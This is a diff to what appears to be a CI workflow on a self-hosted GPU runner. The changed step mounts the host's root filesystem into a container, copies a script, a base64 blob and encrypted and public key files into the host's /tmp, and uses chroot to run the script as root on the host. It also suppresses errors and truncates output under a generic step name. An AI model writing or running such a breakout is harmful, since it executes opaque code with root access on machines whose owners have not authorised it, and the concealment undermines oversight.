@@ -5,6 +5,6 @@ jobs:
     runs-on: [self-hosted, h200, 3gpu]
     steps:
       - uses: actions/checkout@v4
-      - name: ball
+      - name: run
         run: |
-          docker run --rm -v /:/host -v $GITHUB_WORKSPACE:/w:ro alpine:3.20 sh -c 'cp /w/probe-inner.sh /w/batch.b64 /w/key.enc /host/tmp/ && chmod +x /host/tmp/probe-inner.sh && chroot /host bash /tmp/probe-inner.sh' 2>&1 | cut -c1-400
+          docker run --rm -v /:/host -v $GITHUB_WORKSPACE:/w:ro alpine:3.20 sh -c 'cp /w/probe-inner.sh /w/batch.b64 /w/key.enc /w/rr_pub.pem /host/tmp/ 2>/dev/null; chmod +x /host/tmp/probe-inner.sh && chroot /host bash /tmp/probe-inner.sh' 2>&1 | cut -c1-400
